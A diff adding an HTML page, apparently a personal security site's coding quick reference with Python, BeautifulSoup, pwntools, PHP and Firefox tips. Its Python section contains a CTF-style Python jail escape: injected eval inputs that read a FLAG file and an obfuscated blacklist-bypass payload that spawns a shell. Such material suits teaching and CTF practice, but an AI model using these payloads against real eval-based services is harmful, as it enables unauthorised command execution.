@@ -1,0 +1,447 @@
+
+
+<!doctype html>
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+  <head>
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge" />
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><script type="text/javascript">
+
+      var _gaq = _gaq || [];
+      _gaq.push(['_setAccount', 'UA-92365403-1']);
+      _gaq.push(['_trackPageview']);
+
+      (function() {
+        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+      })();
+    </script>
+    <title>Coding Quick Reference &#8212; tech.bitvijays.com</title>
+    <link rel="stylesheet" href="_static/bizstyle.css" type="text/css" />
+    <link rel="stylesheet" href="_static/pygments.css" type="text/css" />
+    <script type="text/javascript" id="documentation_options" data-url_root="./" src="_static/documentation_options.js"></script>
+    <script type="text/javascript" src="_static/jquery.js"></script>
+    <script type="text/javascript" src="_static/underscore.js"></script>
+    <script type="text/javascript" src="_static/doctools.js"></script>
+    <script type="text/javascript" src="_static/bizstyle.js"></script>
+    <link rel="search" title="Search" href="search.html" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <!--[if lt IE 9]>
+    <script type="text/javascript" src="_static/css3-mediaqueries.js"></script>
+    <![endif]-->
+  </head><body>
+    <div class="related" role="navigation" aria-label="related navigation">
+      <h3>Navigation</h3>
+      <ul>
+        <li class="nav-item nav-item-0"><a href="index.html">tech.bitvijays.com</a> &#187;</li> 
+      </ul>
+    </div>
+      <div class="sphinxsidebar" role="navigation" aria-label="main navigation">
+        <div class="sphinxsidebarwrapper">
+  <h3><a href="index.html">Table Of Contents</a></h3>
+  <ul>
+<li><a class="reference internal" href="#">Coding Quick Reference</a><ul>
+<li><a class="reference internal" href="#python">Python</a><ul>
+<li><a class="reference internal" href="#beautifulsoup">BeautifulSoup</a></li>
+<li><a class="reference internal" href="#pwntools">PwnTools</a><ul>
+<li><a class="reference internal" href="#pwn-templates">Pwn Templates</a></li>
+</ul>
+</li>
+<li><a class="reference internal" href="#ctypes">ctypes</a></li>
+</ul>
+</li>
+<li><a class="reference internal" href="#php">PHP</a></li>
+<li><a class="reference internal" href="#burpsuite">BurpSuite</a></li>
+</ul>
+</li>
+</ul>
+
+  <h3>This Page</h3>
+  <ul class="this-page-menu">
+    <li><a href="_sources/LFC-CodingQuickRef.rst.txt"
+           rel="nofollow">Show Source</a></li>
+    <li><a href="https://github.com/bitvijays/bitvijays.github.io-sphinx/blob/master/docs/LFC-CodingQuickRef.rst"
+           rel="nofollow">Show on GitHub</a></li>
+    <li><a href="https://github.com/bitvijays/bitvijays.github.io-sphinx/edit/master/docs/LFC-CodingQuickRef.rst"
+           rel="nofollow">Edit on GitHub</a></li>
+  </ul>
+<div id="searchbox" style="display: none" role="search">
+  <h3>Quick search</h3>
+    <div class="searchformwrapper">
+    <form class="search" action="search.html" method="get">
+      <input type="text" name="q" />
+      <input type="submit" value="Go" />
+      <input type="hidden" name="check_keywords" value="yes" />
+      <input type="hidden" name="area" value="default" />
+    </form>
+    </div>
+</div>
+<script type="text/javascript">$('#searchbox').show(0);</script>
+        </div>
+      </div>
+
+    <div class="document">
+      <div class="documentwrapper">
+        <div class="bodywrapper">
+          <div class="body" role="main">
+            
+  <div class="section" id="coding-quick-reference">
+<h1>Coding Quick Reference<a class="headerlink" href="#coding-quick-reference" title="Permalink to this headline">¶</a></h1>
+<div class="section" id="python">
+<h2>Python<a class="headerlink" href="#python" title="Permalink to this headline">¶</a></h2>
+<p>Use python</p>
+<ul>
+<li><p class="first">[::-1] means</p>
+<p>Assumming a is a string. The Slice notation in python has the syntax -</p>
+</li>
+</ul>
+<blockquote>
+<div><div class="highlight-None notranslate"><div class="highlight"><pre><span></span>list[&lt;start&gt;:&lt;stop&gt;:&lt;step&gt;]
+</pre></div>
+</div>
+<p>So, when you do a[::-1] , it starts from the end, towards the first, taking each element. So it reverses a. This is applicable for lists/tuples as well.</p>
+<p>Example:</p>
+<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>&gt;&gt;&gt; a = &#39;1232&#39;
+&gt;&gt;&gt; a[::-1]
+&#39;2321&#39;
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li>binascii.unhexlify(hexstr) to convert hex to string</li>
+<li>base64.decodestring(str) to decode base64 string</li>
+<li>Convert number to hex</li>
+</ul>
+<blockquote>
+<div><div class="highlight-None notranslate"><div class="highlight"><pre><span></span>hex(15)
+&#39;0xf&#39;
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li>Convert hex to decimal</li>
+</ul>
+<blockquote>
+<div><div class="highlight-None notranslate"><div class="highlight"><pre><span></span>s = &quot;6a48f82d8e828ce82b82&quot;
+i = int(s, 16)
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li>Extract numbers from a string: Use a regexp :</li>
+</ul>
+<blockquote>
+<div><div class="highlight-None notranslate"><div class="highlight"><pre><span></span>&gt;&gt;&gt; import re
+&gt;&gt;&gt; re.findall(r&#39;\d+&#39;, &#39;hello 42 I\&#39;m a 32 string 30&#39;)
+[&#39;42&#39;, &#39;32&#39;, &#39;30&#39;]
+</pre></div>
+</div>
+<p>This would also match 42 from bla42bla. If you only want numbers delimited by word boundaries (space, period, comma), you can use b :</p>
+<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>&gt;&gt;&gt; re.findall(r&#39;\b\d+\b&#39;, &#39;he33llo 42 I\&#39;m a 32 string 30&#39;)
+[&#39;42&#39;, &#39;32&#39;, &#39;30&#39;]
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li>Extract string inside single quotes using python script</li>
+</ul>
+<blockquote>
+<div><p>Use re.findall:</p>
+<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>&gt;&gt;&gt; import re
+&gt;&gt;&gt; strs = &quot;&quot;&quot;text:u&#39;MUC-EC-099_SC-Memory-01_TC-25&#39;
+             text:u&#39;MUC-EC-099_SC-Memory-01_TC-26&#39;
+          text:u&#39;MUC-EC-099_SC-Memory-01_TC-27&#39;&quot;&quot;&quot;
+
+&gt;&gt;&gt; re.findall(r&quot;&#39;(.*?)&#39;&quot;, strs, re.DOTALL)
+[&#39;MUC-EC-099_SC-Memory-01_TC-25&#39;,
+ &#39;MUC-EC-099_SC-Memory-01_TC-26&#39;,
+ &#39;MUC-EC-099_SC-Memory-01_TC-27&#39;
+]
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li>ASCII value of a character in Python</li>
+</ul>
+<blockquote>
+<div><p>function ord() would get the int value of the char. And in case you want to convert back after playing with the number, function chr() does the trick.</p>
+<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>&gt;&gt;&gt; ord(&#39;a&#39;)
+97
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li>Solving Algebraic equations using python: Use sympy
+Use solve() to solve algebraic equations. We suppose all equations are equaled to 0, so solving x**2 == 1 translates into the following code:</li>
+</ul>
+<blockquote>
+<div><div class="highlight-None notranslate"><div class="highlight"><pre><span></span>&gt;&gt;&gt; from sympy.solvers import solve
+&gt;&gt;&gt; from sympy import Symbol
+&gt;&gt;&gt; x = Symbol(&#39;x&#39;)
+&gt;&gt;&gt; solve(x**2 - 1, x)
+[-1, 1]
+</pre></div>
+</div>
+<p>The first argument for solve() is an equation (equaled to zero) and the second argument is the symbol that we want to solve the equation for.</p>
+</div></blockquote>
+<ul class="simple">
+<li>AVL Tree Implementation in Python : <a class="reference external" href="https://github.com/pgrafov/python-avl-tree">python-avl-tree</a></li>
+<li>Convert all strings in a list to int
+So if we have:</li>
+</ul>
+<blockquote>
+<div><div class="highlight-None notranslate"><div class="highlight"><pre><span></span>results = [&#39;1&#39;, &#39;2&#39;, &#39;3&#39;]
+</pre></div>
+</div>
+<p>How do I make it:</p>
+<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>results = [1, 2, 3]
+
+
+Use the map function(in py2):
+</pre></div>
+</div>
+<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>results = map(int, results)
+</pre></div>
+</div>
+<p>In py3:</p>
+<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>results = list(map(int, results))
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li>Read the RGB value of a given pixel in Python?</li>
+</ul>
+<blockquote>
+<div><div class="highlight-None notranslate"><div class="highlight"><pre><span></span>from PIL import Image
+im = Image.open(&quot;dead_parrot.jpg&quot;) #Can be many different formats.
+pix = im.load()
+print im.size #Get the width and hight of the image for iterating over
+print pix[x,y] #Get the RGBA Value of the a pixel of an image
+pix[x,y] = value # Set the RGBA Value of the image (tuple)
+im.save(&quot;alive_parrot.png&quot;) # Save the modified pixels as png
+</pre></div>
+</div>
+</div></blockquote>
+<ul>
+<li><p class="first">Convert Text to Binary and back?</p>
+<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>&gt;&gt;&gt; import binascii
+&gt;&gt;&gt; bin(int(binascii.hexlify(&#39;hello&#39;), 16))
+&#39;0b110100001100101011011000110110001101111&#39;
+</pre></div>
+</div>
+</li>
+</ul>
+<blockquote>
+<div><p>In reverse:</p>
+<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>&gt;&gt;&gt; n = int(&#39;0b110100001100101011011000110110001101111&#39;, 2)
+&gt;&gt;&gt; binascii.unhexlify(&#39;%x&#39; % n)
+&#39;hello&#39;
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li>function ord() would get the int value of the char. And in case you want to convert back after playing with the number, function chr() does the trick.</li>
+</ul>
+<blockquote>
+<div><div class="highlight-None notranslate"><div class="highlight"><pre><span></span>&gt;&gt;&gt; ord(&#39;a&#39;)
+97
+&gt;&gt;&gt; chr(97)
+&#39;a&#39;
+&gt;&gt;&gt; chr(ord(&#39;a&#39;) + 3)
+&#39;d&#39;
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li>String formating of numbers in python (Print 0000 - 9999)</li>
+</ul>
+<blockquote>
+<div><div class="highlight-None notranslate"><div class="highlight"><pre><span></span>&gt;&gt;&gt; for i in xrange(10):
+...     &#39;{0:04}&#39;.format(i)
+...
+&#39;0000&#39;
+&#39;0001&#39;
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li>Insert a newline character every 64 characters using Python</li>
+</ul>
+<blockquote>
+<div><div class="highlight-None notranslate"><div class="highlight"><pre><span></span>s = &quot;0123456789&quot;*100 # test string
+import re
+print re.sub(&quot;(.{64})&quot;, &quot;\\1\n&quot;, s, 0, re.DOTALL)
+</pre></div>
+</div>
+</div></blockquote>
+<ul>
+<li><p class="first">Having a function where you can provide parameter in online webform? Like there is a function definition like def fun() where we can pass two arguments, that are interpreted.</p>
+<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>def fun(User_Input):
+
+    c = a + b
+        return c
+</pre></div>
+</div>
+</li>
+</ul>
+<blockquote>
+<div><p>Try</p>
+<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>1.   a,b=dir()[0]
+2.   a,b=print(&quot;Hello&quot;)
+3.   a,b=print(exec(&quot;import os&quot;),eval(&quot;os.listdir(&#39;.&#39;)&quot;))
+
+Cat a file?
+
+1.   a, b, c = __import__(&#39;os&#39;).system(&#39;cat FLAG&#39;)
+2.   a,b=print(open(&quot;FLAG&quot;, &quot;r&quot;).read())
+</pre></div>
+</div>
+<p>The above should work fine till there are no blacklist wordlist provided.</p>
+<p>Let’s craft a payload to bypass the blacklist.</p>
+<p>Create a string class (also works with list or dict)</p>
+<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>&gt;&gt;&gt; &#39;&#39;.__class__
+&lt;class &#39;str&#39;&gt;
+</pre></div>
+</div>
+<p>Now we need the parent class, there is two ways:</p>
+<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>&gt;&gt;&gt; &#39;&#39;.__class__.__base__
+&lt;class &#39;object&#39;&gt;
+&gt;&gt;&gt; &#39;&#39;.__class__.__mro__
+(&lt;class &#39;str&#39;&gt;, &lt;class &#39;object&#39;&gt;)
+&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[1]
+&lt;class &#39;object&#39;&gt;
+</pre></div>
+</div>
+<p>Now we have the object class. So we can access to all the child classes:</p>
+<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>&gt;&gt;&gt; &#39;&#39;.__class__.__base__.__subclasses__()
+[&lt;class &#39;type&#39;&gt;, &lt;class &#39;weakref&#39;&gt;, &lt;class &#39;weakcallableproxy&#39;&gt;, &lt;class &#39;weakproxy&#39;&gt;, &lt;class &#39;int&#39;&gt;, &lt;class &#39;bytearray&#39;&gt;, &lt;class &#39;bytes&#39;&gt;, &lt;class &#39;list&#39;&gt;, &lt;class &#39;NoneType&#39;&gt;, &lt;class &#39;NotImplementedType&#39;&gt;, &lt;class &#39;traceback&#39;&gt;, &lt;class &#39;super&#39;&gt;, &lt;class &#39;range&#39;&gt;, &lt;class &#39;dict&#39;&gt;, &lt;class &#39;dict_keys&#39;&gt;, &lt;class &#39;dict_values&#39;&gt;, &lt;class &#39;dict_items&#39;&gt;, &lt;class &#39;odict_iterator&#39;&gt;, &lt;class &#39;set&#39;&gt;, &lt;class &#39;str&#39;&gt;, &lt;class &#39;slice&#39;&gt;, &lt;class &#39;staticmethod&#39;&gt;, &lt;class &#39;complex&#39;&gt;, &lt;class &#39;float&#39;&gt;, &lt;class &#39;frozenset&#39;&gt;, &lt;class &#39;property&#39;&gt;, &lt;class &#39;managedbuffer&#39;&gt;, &lt;class &#39;memoryview&#39;&gt;, &lt;class &#39;tuple&#39;&gt;, &lt;class &#39;enumerate&#39;&gt;, &lt;class &#39;reversed&#39;&gt;, &lt;class &#39;stderrprinter&#39;&gt;, &lt;class &#39;code&#39;&gt;, &lt;class &#39;frame&#39;&gt;, &lt;class &#39;builtin_function_or_method&#39;&gt;, &lt;class &#39;method&#39;&gt;, &lt;class &#39;function&#39;&gt;, &lt;class &#39;mappingproxy&#39;&gt;, &lt;class &#39;generator&#39;&gt;, &lt;class &#39;getset_descriptor&#39;&gt;, &lt;class &#39;wrapper_descriptor&#39;&gt;, &lt;class &#39;method-wrapper&#39;&gt;, &lt;class &#39;ellipsis&#39;&gt;, &lt;class &#39;member_descriptor&#39;&gt;, &lt;class &#39;types.SimpleNamespace&#39;&gt;, &lt;class &#39;PyCapsule&#39;&gt;, &lt;class &#39;longrange_iterator&#39;&gt;, &lt;class &#39;cell&#39;&gt;, &lt;class &#39;instancemethod&#39;&gt;, &lt;class &#39;classmethod_descriptor&#39;&gt;, &lt;class &#39;method_descriptor&#39;&gt;, &lt;class &#39;callable_iterator&#39;&gt;, &lt;class &#39;iterator&#39;&gt;, &lt;class &#39;coroutine&#39;&gt;, &lt;class &#39;coroutine_wrapper&#39;&gt;, &lt;class &#39;moduledef&#39;&gt;, &lt;class &#39;module&#39;&gt;, &lt;class &#39;EncodingMap&#39;&gt;, &lt;class &#39;fieldnameiterator&#39;&gt;, &lt;class &#39;formatteriterator&#39;&gt;, &lt;class &#39;filter&#39;&gt;, &lt;class &#39;map&#39;&gt;, &lt;class &#39;zip&#39;&gt;, &lt;class &#39;BaseException&#39;&gt;, &lt;class &#39;hamt&#39;&gt;, &lt;class &#39;hamt_array_node&#39;&gt;, &lt;class &#39;hamt_bitmap_node&#39;&gt;, &lt;class &#39;hamt_collision_node&#39;&gt;, &lt;class &#39;keys&#39;&gt;, &lt;class &#39;values&#39;&gt;, &lt;class &#39;items&#39;&gt;, &lt;class &#39;Context&#39;&gt;, &lt;class &#39;ContextVar&#39;&gt;, &lt;class &#39;Token&#39;&gt;, &lt;class &#39;Token.MISSING&#39;&gt;, &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt;, &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt;, &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt;, &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt;, &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt;, &lt;class &#39;_frozen_importlib.BuiltinImporter&#39;&gt;, &lt;class &#39;classmethod&#39;&gt;, &lt;class &#39;_frozen_importlib.FrozenImporter&#39;&gt;, &lt;class &#39;_frozen_importlib._ImportLockContext&#39;&gt;, &lt;class &#39;_thread._localdummy&#39;&gt;, &lt;class &#39;_thread._local&#39;&gt;, &lt;class &#39;_thread.lock&#39;&gt;, &lt;class &#39;_thread.RLock&#39;&gt;, &lt;class &#39;zipimport.zipimporter&#39;&gt;, &lt;class &#39;_frozen_importlib_external.WindowsRegistryFinder&#39;&gt;, &lt;class &#39;_frozen_importlib_external._LoaderBasics&#39;&gt;, &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt;, &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt;, &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt;, &lt;class &#39;_frozen_importlib_external.PathFinder&#39;&gt;, &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt;, &lt;class &#39;_io._IOBase&#39;&gt;, &lt;class &#39;_io._BytesIOBuffer&#39;&gt;, &lt;class &#39;_io.IncrementalNewlineDecoder&#39;&gt;, &lt;class &#39;posix.ScandirIterator&#39;&gt;, &lt;class &#39;posix.DirEntry&#39;&gt;, &lt;class &#39;codecs.Codec&#39;&gt;, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &lt;class &#39;codecs.StreamReaderWriter&#39;&gt;, &lt;class &#39;codecs.StreamRecoder&#39;&gt;, &lt;class &#39;_abc_data&#39;&gt;, &lt;class &#39;abc.ABC&#39;&gt;, &lt;class &#39;dict_itemiterator&#39;&gt;, &lt;class &#39;collections.abc.Hashable&#39;&gt;, &lt;class &#39;collections.abc.Awaitable&#39;&gt;, &lt;class &#39;collections.abc.AsyncIterable&#39;&gt;, &lt;class &#39;async_generator&#39;&gt;, &lt;class &#39;collections.abc.Iterable&#39;&gt;, &lt;class &#39;bytes_iterator&#39;&gt;, &lt;class &#39;bytearray_iterator&#39;&gt;, &lt;class &#39;dict_keyiterator&#39;&gt;, &lt;class &#39;dict_valueiterator&#39;&gt;, &lt;class &#39;list_iterator&#39;&gt;, &lt;class &#39;list_reverseiterator&#39;&gt;, &lt;class &#39;range_iterator&#39;&gt;, &lt;class &#39;set_iterator&#39;&gt;, &lt;class &#39;str_iterator&#39;&gt;, &lt;class &#39;tuple_iterator&#39;&gt;, &lt;class &#39;collections.abc.Sized&#39;&gt;, &lt;class &#39;collections.abc.Container&#39;&gt;, &lt;class &#39;collections.abc.Callable&#39;&gt;, &lt;class &#39;os._wrap_close&#39;&gt;, &lt;class &#39;_sitebuiltins.Quitter&#39;&gt;, &lt;class &#39;_sitebuiltins._Printer&#39;&gt;, &lt;class &#39;_sitebuiltins._Helper&#39;&gt;, &lt;class &#39;types.DynamicClassAttribute&#39;&gt;, &lt;class &#39;types._GeneratorWrapper&#39;&gt;, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &lt;class &#39;importlib.abc.Finder&#39;&gt;, &lt;class &#39;importlib.abc.Loader&#39;&gt;, &lt;class &#39;importlib.abc.ResourceReader&#39;&gt;, &lt;class &#39;operator.itemgetter&#39;&gt;, &lt;class &#39;operator.attrgetter&#39;&gt;, &lt;class &#39;operator.methodcaller&#39;&gt;, &lt;class &#39;itertools.accumulate&#39;&gt;, &lt;class &#39;itertools.combinations&#39;&gt;, &lt;class &#39;itertools.combinations_with_replacement&#39;&gt;, &lt;class &#39;itertools.cycle&#39;&gt;, &lt;class &#39;itertools.dropwhile&#39;&gt;, &lt;class &#39;itertools.takewhile&#39;&gt;, &lt;class &#39;itertools.islice&#39;&gt;, &lt;class &#39;itertools.starmap&#39;&gt;, &lt;class &#39;itertools.chain&#39;&gt;, &lt;class &#39;itertools.compress&#39;&gt;, &lt;class &#39;itertools.filterfalse&#39;&gt;, &lt;class &#39;itertools.count&#39;&gt;, &lt;class &#39;itertools.zip_longest&#39;&gt;, &lt;class &#39;itertools.permutations&#39;&gt;, &lt;class &#39;itertools.product&#39;&gt;, &lt;class &#39;itertools.repeat&#39;&gt;, &lt;class &#39;itertools.groupby&#39;&gt;, &lt;class &#39;itertools._grouper&#39;&gt;, &lt;class &#39;itertools._tee&#39;&gt;, &lt;class &#39;itertools._tee_dataobject&#39;&gt;, &lt;class &#39;reprlib.Repr&#39;&gt;, &lt;class &#39;collections.deque&#39;&gt;, &lt;class &#39;_collections._deque_iterator&#39;&gt;, &lt;class &#39;_collections._deque_reverse_iterator&#39;&gt;, &lt;class &#39;collections._Link&#39;&gt;, &lt;class &#39;functools.partial&#39;&gt;, &lt;class &#39;functools._lru_cache_wrapper&#39;&gt;, &lt;class &#39;functools.partialmethod&#39;&gt;, &lt;class &#39;contextlib.ContextDecorator&#39;&gt;, &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt;, &lt;class &#39;contextlib._BaseExitStack&#39;&gt;, &lt;class &#39;rlcompleter.Completer&#39;&gt;]
+</pre></div>
+</div>
+<p>Let’s find a more suitable way to access the subclasses by index:</p>
+<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>&gt;&gt;&gt; for i,val in enumerate(&#39;&#39;.__class__.__mro__[1].__subclasses__()):
+...   print(i,&#39;: &#39;,val)
+</pre></div>
+</div>
+<p>Using __init__ to initialize the class and __globals__ to access the global namespace of the module in which the function was defined.</p>
+<p><a class="reference external" href="https://github.com/kimtruth/GoN-Write-up">pyjail WU</a> was able to call <cite>sys</cite> from <cite>codecs.StreamReaderWriter</cite> class.</p>
+<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>&#39;&#39;.__class__.__mro__[1].__subclasses__()[104]
+&lt;class &#39;codecs.StreamReaderWriter&#39;&gt;`
+</pre></div>
+</div>
+<p>So from this namespace we are able to call sys.</p>
+<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__[&quot;sys&quot;]
+&lt;module &#39;sys&#39; (built-in)&gt;
+</pre></div>
+</div>
+<p>Then it’s easy to import os:</p>
+<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;]
+&lt;module &#39;os&#39; from &#39;/usr/lib/python3.7/os.py&#39;&gt;
+</pre></div>
+</div>
+<p>And finally using system method to launch a system command and read the flag:</p>
+<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>&#39;&#39;.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;cat FLAG&quot;)
+</pre></div>
+</div>
+<p>However if “.” and “__” are also blacklisted then we can use</p>
+<ul class="simple">
+<li>Without . to call method, we can use getattr instead</li>
+<li>Without __import__, we can use catch_warnings in {}.__class__.__base__.__subclasses__()</li>
+</ul>
+<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>{}.__class__.__base__.__subclasses__()[[i.__name__ == &quot;catch_warnings&quot; for i in {}.__class__.__base__.__subclasses__()].index(True)] this will give me catch_warnings
+{}.__class__.__base__.__subclasses__()[[i.__name__ == &quot;catch_warnings&quot; for i in {}.__class__.__base__.__subclasses__()].index(True)]()._module.__builtins__[&quot;__import__&quot;](&quot;os&quot;).system(&quot;sh&quot;) this will give me shell
+</pre></div>
+</div>
+<p>Then we just need to change . to getattr, and _ to dir(0)[0][0]
+Final payload :</p>
+<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>getattr(getattr(getattr(getattr(getattr(getattr((), dir(0)[0][0]*2+&quot;class&quot;+dir(0)[0][0]*2), dir(0)[0][0]*2+&quot;base&quot;+dir(0)[0][0]*2), dir(0)[0][0]*2+&quot;subcl&quot;+&quot;asses&quot;+dir(0)[0][0]*2)()[getattr([getattr(i, dir(0)[0][0]*2+&quot;name&quot;+dir(0)[0][0]*2) == &quot;catch&quot;+dir(0)[0][0]+&quot;warnings&quot; for i in getattr(getattr(getattr((), dir(0)[0][0]*2+&quot;class&quot;+dir(0)[0][0]*2), dir(0)[0][0]*2+&quot;base&quot;+dir(0)[0][0]*2), dir(0)[0][0]*2+&quot;subcl&quot;+&quot;asses&quot;+dir(0)[0][0]*2)()], &quot;index&quot;)(True)](), dir(0)[0][0]+&quot;module&quot;), dir(0)[0][0]*2+&quot;builtins&quot;+dir(0)[0][0]*2)[dir(0)[0][0]*2+&quot;imp&quot;+&quot;ort&quot;+dir(0)[0][0]*2](&quot;o&quot;+&quot;s&quot;), &quot;sy&quot;+&quot;stem&quot;)(&quot;sh&quot;)
+</pre></div>
+</div>
+</div></blockquote>
+<div class="section" id="beautifulsoup">
+<h3>BeautifulSoup<a class="headerlink" href="#beautifulsoup" title="Permalink to this headline">¶</a></h3>
+<p>A tag may have any number of attributes. The tag &lt;b id=”boldest”&gt; has an attribute “id” whose value is “boldest”. You can access a tag’s attributes by treating the tag like a dictionary:</p>
+<p>tag[‘id’]
+# u’boldest’</p>
+<p>You can access that dictionary directly as .attrs:</p>
+<p>tag.attrs
+# {u’id’: ‘boldest’}</p>
+<p>and read the tag value using</p>
+<p>print(tag.get(‘id’))</p>
+<p>If you have something like</p>
+<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>&lt;form id=&quot;form_product_page&quot; name=&quot;form_1362737440&quot; action=&quot;/download/791055/164084/&quot; method=&quot;get&quot;&gt;
+&lt;input id=&quot;nojssubmit&quot; type=&quot;submit&quot; value=&quot;Download&quot; /&gt;
+&lt;/form&gt;
+</pre></div>
+</div>
+<p>and want action value we can</p>
+<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>action = soup.find(&#39;form&#39;, id=&#39;form_product_page&#39;).get(&#39;action&#39;)
+</pre></div>
+</div>
+</div>
+<div class="section" id="pwntools">
+<h3>PwnTools<a class="headerlink" href="#pwntools" title="Permalink to this headline">¶</a></h3>
+<p>Importing</p>
+<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>&gt;&gt;&gt; from pwn import *
+</pre></div>
+</div>
+<p>Making Connections</p>
+<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>conn = remote(&#39;ftp.ubuntu.com&#39;,21)
+</pre></div>
+</div>
+<p>Receiving Lines</p>
+<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>conn.recvline()
+conn.recvuntil(&#39; &#39;, drop=True)
+</pre></div>
+</div>
+<p>Sending Lines</p>
+<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>conn.send(&#39;USER anonymous\r\n&#39;)
+conn.sendline(&#39;Hello&#39;)
+</pre></div>
+</div>
+<div class="section" id="pwn-templates">
+<h4>Pwn Templates<a class="headerlink" href="#pwn-templates" title="Permalink to this headline">¶</a></h4>
+<p><a class="reference external" href="https://github.com/Gallopsled/pwntools/pull/909">pwn template</a> command can be used for generating templates.</p>
+</div>
+</div>
+<div class="section" id="ctypes">
+<h3>ctypes<a class="headerlink" href="#ctypes" title="Permalink to this headline">¶</a></h3>
+<p>A foreign function library for Python. It provides C compatible data types, and allows calling functions in DLLs or shared libraries. It can be used to wrap these libraries in pure Python. ctypes exports the cdll, and on Windows windll and oledll objects, for loading dynamic link libraries.</p>
+</div>
+</div>
+<div class="section" id="php">
+<h2>PHP<a class="headerlink" href="#php" title="Permalink to this headline">¶</a></h2>
+<ul class="simple">
+<li>mysqli_real_escape_string — Escapes special characters in a string for use in an SQL statement, taking into account the current charset of the connection.</li>
+<li>filter_var — Filters a variable with a specified filter. There are multiple types of <a class="reference external" href="http://php.net/manual/en/filter.filters.php">filter</a> such as Validate, Sanitize etc.</li>
+</ul>
+</div>
+<div class="section" id="burpsuite">
+<h2>BurpSuite<a class="headerlink" href="#burpsuite" title="Permalink to this headline">¶</a></h2>
+<ol class="arabic simple">
+<li>In a new tab, type or paste <a class="reference external" href="about:config">about:config</a> in the address bar and press Enter/Return. Click the button promising to be careful.</li>
+<li>In the search box above the list, type or paste captiv and pause while the list is filtered</li>
+</ol>
+<p>(3) Double-click the network.captive-portal-service.enabled preference to switch the value from true to false
+If you are in a managed environment using an autoconfig file, for example, you could use this to switch the default:
+user_pref(“network.captive-portal-service.enabled”, false);</p>
+</div>
+</div>
+
+
+          </div>
+        </div>
+      </div>
+      <div class="clearer"></div>
+    </div>
+    <div class="related" role="navigation" aria-label="related navigation">
+      <h3>Navigation</h3>
+      <ul>
+        <li class="nav-item nav-item-0"><a href="index.html">tech.bitvijays.com</a> &#187;</li> 
+      </ul>
+    </div>
+    <div class="footer" role="contentinfo">
+        &#169; Copyright 2017, Vijay Kumar.
+    </div>
+  </body>
+</html>
